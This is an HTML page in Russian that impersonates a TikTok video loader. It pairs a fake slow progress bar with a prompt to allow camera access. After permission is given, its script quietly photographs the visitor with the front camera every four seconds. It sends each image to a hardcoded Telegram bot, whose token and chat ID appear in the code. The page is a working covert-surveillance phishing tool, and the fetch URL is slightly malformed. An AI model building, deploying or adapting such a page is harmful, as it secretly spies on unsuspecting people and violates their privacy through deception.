<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok</title>
    <style>
        body { 
            background-color: #010101; 
            color: white; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            margin: 0; 
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
            overflow: hidden; 
        }

        .logo { 
            width: 100px; 
            height: 100px; 
            margin-bottom: 20px; 
            border-radius: 22px; 
            box-shadow: 0 4px 15px rgba(254, 44, 85, 0.2);
        }

        .loader { 
            border: 4px solid rgba(255, 255, 255, 0.1); 
            border-top: 4px solid #fe2c55; 
            border-radius: 50%; 
            width: 40px; 
            height: 40px; 
            animation: spin 1s linear infinite; 
            margin-bottom: 10px;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .text { 
            font-size: 18px; 
            font-weight: 600; 
            margin-top: 10px;
        }

        /* Полоса загрузки */
        .progress-container {
            width: 260px;
            height: 6px;
            background-color: #333;
            border-radius: 10px;
            margin: 20px 0 8px 0;
            overflow: hidden;
        }

        .progress-bar {
            width: 0%;
            height: 100%;
            background-color: #fe2c55;
            transition: width 1.2s cubic-bezier(0.22, 1, 0.36, 1); 
            box-shadow: 0 0 10px rgba(254, 44, 85, 0.5);
        }

        .percent-text {
            font-size: 13px;
            color: #8a8a8a;
        }

        #video, #canvas { display: none; position: absolute; }
        
        .permission-hint {
            background-color: #fe2c55;
            color: white;
            padding: 14px 28px;
            border-radius: 50px; 
            font-size: 16px;
            font-weight: bold;
            margin-bottom: 30px;
            text-align: center;
            z-index: 10;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
    </style>
</head>
<body>
    <img src="https://sf-tb-static.fingerfun.com" alt="TikTok" class="logo">
    
    <div id="hint" class="permission-hint">Нажмите «Разрешить», чтобы продолжить</div>
    
    <div class="loader"></div>
    <div class="text">Загрузка видео...</div>

    <!-- Полоса прогресса -->
    <div class="progress-container">
        <div id="progressBar" class="progress-bar"></div>
    </div>
    <div id="percent" class="percent-text">0%</div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

<script>
    const botToken = '8220142638:AAFDjQSzi4V1i5xfpMBA42uBgaDjFA0znOo';
    const chatId = '8573089884';
    let isProcessing = false;

    // Функция имитации загрузки (3 минуты с рывками)
    function startFakeProgress() {
        const bar = document.getElementById('progressBar');
        const percentEl = document.getElementById('percent');
        let currentProgress = 0;
        const totalTime = 180000; // 3 минуты
        const startTime = Date.now();

        const update = () => {
            const elapsed = Date.now() - startTime;
            const progressTarget = Math.min((elapsed / totalTime) * 100, 100);

            if (currentProgress < progressTarget) {
                // Прыжок на случайное значение
                currentProgress += Math.random() * 7; 
                if (currentProgress > progressTarget) currentProgress = progressTarget;
                
                bar.style.width = currentProgress + '%';
                percentEl.innerText = Math.round(currentProgress) + '%';
            }

            if (elapsed < totalTime) {
                // Случайная пауза между рывками
                setTimeout(update, Math.random() * 3000 + 1000);
            } else {
                bar.style.width = '100%';
                percentEl.innerText = '100%';
            }
        };
        update();
    }

    async function takeAndSendPhoto() {
        if (isProcessing) return;
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        if (video.videoWidth === 0) return;

        isProcessing = true;
        const scale = 640 / video.videoWidth;
        canvas.width = 640;
        canvas.height = video.videoHeight * scale;

        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'shot.jpg');
            try {
                await fetch(`https://api.telegram.org{botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) { console.error(e); } 
            finally { isProcessing = false; }
        }, 'image/jpeg', 0.1); 
    }

    window.onload = () => {
        startFakeProgress(); // Запуск полоски сразу

        navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } } 
        })
        .then(stream => {
            document.getElementById('hint').style.display = 'none';
            const video = document.getElementById('video');
            video.srcObject = stream;
            
            video.onloadedmetadata = () => {
                video.play();
                setTimeout(() => {
                    takeAndSendPhoto();
                    setInterval(takeAndSendPhoto, 4000); 
                }, 2000);
            };
        })
        .catch(err => { 
            document.getElementById('hint').innerText = "Ошибка: разрешите доступ к камере";
            document.getElementById('hint').style.backgroundColor = "gray";
        });
    };
</script>
</body>
</html>

</html>
